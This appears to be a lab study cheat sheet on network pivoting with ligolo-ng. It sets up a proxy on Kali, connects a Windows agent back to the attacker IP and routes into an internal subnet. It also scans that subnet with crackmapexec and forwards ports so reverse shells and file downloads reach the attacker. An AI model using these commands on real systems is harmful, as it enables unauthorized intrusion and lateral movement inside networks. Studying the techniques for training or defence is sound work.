---
IP_KALI: 192.168.45.200
IP_TARGET: 192.168.115.75
NETWORK: 10.10.143.0/24
PORT: "11601"
---
- Agent: Executed on Pivot host
- Proxy: Executed on ATK box

Setup Proxy on kali:
```
sudo ip tuntap add user kali mode tun ligolo
```
```
sudo ip link set ligolo up
```
Execute proxy:
```
./proxy -selfcert
```

Setup agent on Windows:
- ~={green}.\agent.exe -connect <span id="IP_KALI"/>192.168.45.200<span type="end"/>:<span id="PORT"/>11601<span type="end"/> -ignore-cert=~

In ligolo proxy (Kali):
```
session
```
```
ifconfig
```

On Kali:
- sudo ip route add <span id="NETWORK"/>10.10.143.0/24<span type="end"/> dev ligolo
- Confirm:
	```
	ip route list
	```

In logolo proxy (Kali):
```
session
```
```
start
```

Confirm it is working:
- ~={green}crackmapexec smb <span id="NETWORK"/>10.10.143.0/24<span type="end"/>=~

Forwarding reverse shells and doing file transfers:
- Start tunnel as usual
- listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
- Start listener
	- rlwrap nc -nlvp 443
- Execute the reverse shell using the ~={red}INTERNAL IP=~ address of the agent, not the one that kali can see, the one that the ultimate victim can see
# Guide
Ligolo works easily and does the heavy lift - (sorry for long post, but would be nice so others can see it here, also will pin it)
 
1. MS01 has 10.10.123.148 as 2nd IP 
2. Kali IP is 192.168.45.203 
3. MS02 can't reach KALI , so needs to go through MS01 to reach Kali , right? 

Mindset : Let's say you want to download a file from your KALI like usual where you opened this -> ```python3 -m http.server 80```  !
You have opened server on 192.168.45.203:80   , but MS02 ONLY reaches MS01 , so you need to port forward . 
To make thing simple for myself I added a listener that does this port forwarding MS:80 to KALI:80 , looks like  this on session 1 (where MS01 is connected)-> ```listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp```  
How to reach Kali IP now to download something? On MS02 a command like this -> wget MS01:80 , and will redirect to KALI:80 .. 
In your care (just as an example, don't take it blindly copy paste), ```powershell wget http://10.10.123.148:80/test``` 
And that's it .. 

SAME goes for let's say a reverse shell .. add a new listener but with port 443 for example , and so on! 

IF that is not working either, consider you are ADMIN on the first pivot machine , you can play with that machine to do WATHEVER you need.. what do you think , adding a rule to have port 80 and 443 in exceptions could do the trick? Play around , and read about this again, and again. Took me 1 hour to play with this and understand the principle how it works .
Saved my day  -> https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5


How to Port Forwad all internal ports? ---> you connect to agent on port 11601 server , choose session, and in that session you start tunneling using the virtual network called whatever you chosed. After doing that add route 240.0.0.1 and that's all , every local port is forwarded to your Kali and you will use 240.0.0.1 to access the internal ports of that machine -> https://github.com/nicocha30/ligolo-ng/wiki/Localhost